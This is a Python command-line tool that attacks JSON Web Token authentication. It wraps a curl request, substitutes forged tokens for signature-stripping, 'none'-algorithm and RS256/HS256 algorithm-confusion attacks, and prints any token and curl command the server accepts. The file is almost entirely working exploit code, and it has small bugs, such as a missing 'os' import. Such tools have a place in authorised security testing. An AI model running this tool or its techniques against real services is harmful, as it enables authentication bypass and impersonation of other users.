import hashlib
import json
import random
import re
import shlex
import subprocess
import sys
import typing

from optparse import OptionParser

from jwt import JsonWebToken

parser = OptionParser('usage: %prog [options] curl [curl_arguments]')
parser.description = 'Attack a JWT implementation.'
parser.add_option("-q", "--quiet",
                  action="store_false", dest="verbose", default=True,
                  help="don't print status messages to stdout")
parser.add_option("-k", "--key", dest="key", default=None, type="str",
                  help="key for signing the JWT")
parser.add_option("--key-file", dest="key_file", default=None, type="str",
                  help="key file for signing the JWT")
parser.add_option('--target-payload', dest="target_payload", default=None, type="str",
                  help="target payload JSON")
parser.add_option('--inspect', dest="inspect", default=False, action="store_true",
                  help="inspect the JWT")

try:
    curl_index = sys.argv.index('curl')
    args = sys.argv[1:curl_index]
except ValueError as e:
    args = sys.argv[1:]
    
(options, remaining_args) = parser.parse_args(args=args)
if len(remaining_args) > 0:
    parser.error(f'Unexpected argument(s): {" ".join(remaining_args)}')

if options.key and options.key_file:
    parser.error(f'Cannot pass both --key and --key-file arguments.')

cmd = sys.argv[curl_index:]
key = options.key
if options.key_file:
    with open(options.key_file, 'rb') as f:
        key = f.read()
target_payload = json.loads(options.target_payload) if options.target_payload else None

jwt_tokens = [
    token    
    for arg in cmd
    for token in re.findall(r'(ey.*\.ey.*.[^.]*)', arg)
]

if len(jwt_tokens) != 1:
    print(f'Expected to find exactly one JWT. Found {len(jwt_tokens)}', file=sys.stderr)
    exit(1)

log = sys.stderr if options.verbose else open(os.devnull, 'w')
err = sys.stderr

def fail(msg):
    err.write('Aborting. ')
    err.write(msg)
    exit(1)

def execute_curl(cmd) -> typing.Tuple[int, str]:
    cmd = cmd.copy()
    if '-v' not in cmd:
        cmd.append('-v')
    if '-s' not in cmd:
        cmd.append('-s')    
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout.read()
    stderr = proc.stderr.read()

    status_match = re.search(r'^< HTTP/[0-9.]+ ([0-9]+)', stderr.decode('utf-8'), re.MULTILINE)
    if not status_match:
        raise Exception(f"No status found in response for: {cmd}")
    
    # TODO check for location header as well

    status = int(status_match[1])
    digest = hashlib.sha256(stdout).hexdigest()

    return status, digest

jwt = JsonWebToken(jwt_tokens[0])

if options.inspect:
    print('Token is:')
    print(jwt)
    exit(0)

log.write('Testing for identical results...\n')
test_run1 = execute_curl(cmd)
test_run2 = execute_curl(cmd)
if test_run1[0] != test_run2[0]:
    fail(f'Responses vary across identical requests: {test_run1[0]} vs {test_run2[0]}')

jwt_signature_not_verified = JsonWebToken(jwt_tokens[0])
jwt_signature_not_verified.header['random'] = random.random()

jwt_none_algorithm_allowed = JsonWebToken(jwt_tokens[0]).build_with_alg_none()

attacks = [
    ('signature not verified', jwt_signature_not_verified.to_token()),
    ('none algorithm allowed', jwt_none_algorithm_allowed.to_token())
]

if jwt.header['alg'] == 'RS256' and key is not None:
    attacks.append(
        ('algorithm confusion', JsonWebToken(jwt_tokens[0], key=key).build_with_alg_hsa().to_token())
    )

success = False
successful_jwt = None

for attack_name, attack_token in attacks:
    print(f'Attempting attack: {attack_name} ... ', end='')

    attack_cmd = [
        arg.replace(jwt_tokens[0], attack_token)
        for arg in cmd
    ]
    attack_result = execute_curl(attack_cmd)

    if attack_result == test_run1:
        print('SUCCESS')
        attack_jwt = JsonWebToken(attack_token)
        if options.target_payload:
            attack_jwt.payload = target_payload
        if attack_jwt.header['alg'] in ['HS256', 'RS256']:
            attack_jwt.key = key

        successful_jwt = attack_jwt
        success = True
    else:
        print('FAILURE')

if not success and jwt.header['alg'] == 'HS256' and key is not None and options.target_payload:
    print('Signing target JWT with provided key ... SUCCESS assumed')
    success = True
    successful_jwt = JsonWebToken(jwt_tokens[0], key=key)

print()

if success:
    successful_jwt_encoded = successful_jwt.to_token()
    attack_cmd = [
        arg.replace(jwt_tokens[0], successful_jwt_encoded)
        for arg in cmd
    ]
    print("Successful JWT:")
    print(successful_jwt)
    print()
    print("Successful curl command:")
    print(shlex.join(attack_cmd))
else:
    print('No successful attacks.')

    if key is None:
        print('If you know the key you sign a target JWT with --key-file and --target-payload.')
        print()
        
    if jwt.header['alg'] == 'RS256' and key is None:
        print('If you know the public key you can attempt a confusion attack with --key-file.')
        print('You can derive the public key from two examples. See https://github.com/silentsignal/rsa_sign2n/tree/release/standalone.')
        print()
